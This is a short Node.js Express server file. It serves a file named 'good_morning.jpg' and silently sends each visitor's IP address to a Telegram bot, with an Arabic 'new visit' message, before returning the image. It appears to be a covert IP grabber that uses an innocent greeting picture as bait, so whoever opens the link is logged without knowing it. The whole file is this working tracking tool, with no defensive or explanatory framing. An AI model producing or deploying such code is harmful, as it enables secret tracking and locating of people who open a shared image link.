import express from "express";
import fetch from "node-fetch";
import path from "path";

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

async function notify(msg) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
  });
}

app.get("/good_morning.jpg", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  await notify(`زيارة جديدة: IP = ${ip}`);
  res.set("Content-Type", "image/jpeg");
  res.sendFile(path.join(process.cwd(), "good_morning.jpg"));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
